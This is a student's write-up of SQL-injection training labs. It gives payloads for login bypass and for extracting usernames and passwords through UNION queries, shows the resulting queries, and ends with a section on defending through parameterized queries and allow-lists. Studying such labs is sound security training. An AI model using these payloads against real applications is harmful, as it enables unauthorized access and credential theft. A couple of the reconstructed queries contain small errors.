--Lab 1. Retrieve hidden data
--(1) '+or+1=1--
--(2) SELECT * FROM products WHERE category = 'Gifts' AND released = 1
--(3) It worked because OR 1=1 made the condition always true, while -- commented out the rest of the query.

--Lab 2. 
--(1) administrator'--
--(2) SELECT * FROM users WHERE username 'administrator'--'AND password = 'whatever';
--(3) It worked because -- comments out the rest of the query and the database only needs the username in that case. 

--Lab 3.
--(1) %27+union+select+username,password+from+users--
--(2) SELECT * FROM products WHERE category = '' UNION SELECT username, password FROM users--'
--(3) It worked because %27 broke the context and allowed a UNION statement to retrieve text columns from the users table.

--Lab 4.
--(1) %27+ORDER+BY+4--
--(2) SELECT * FROM products WHERE category = '' ORDER BY 4--'
--(3) It worked because injecting an 'ORDER BY' with greater number than the actual column count forces the database to return an error, revealing that the query contains exactly 3 columns.

--Lab 5. 
--(1) %27+UNION+SELECT+NULL,%275qYf0h%27,NULL--
--(2) SELECT * FROM products WHERE category = '' UNION SELECT NULL, '5qYf0h', NULL--'
--(3) It worked because %27 broke the context and allowed a UNION statement to find a column that accepts text data.

--Lab 6.
--(1) %27+union+select+null,username||%27~%27||password+from+users--
--(2) SELECT * FROM products WHERE category = '' UNION SELECT NULL, username || '~' || password FROM users--'
--(3) It worked because %27 broke the context and allowed a UNION statement to combine multiple fields into the single available text column.


-- Challenge 9 "Now defent it"
-- Why $1 stops the attack:
Concatenation directly changes the SQL structure. Parameterization ($1) treats the input strictly as data, making it impossible for injected characters like %27 to execute as SQL commands.

-- Why ORDER BY / column names cannot be parameterized:
Parameters only work for data values in WHERE clauses. Structural parts like ORDER BY or column names must be known before the query runs, so they cannot be parameterized and require a whitelist instead.
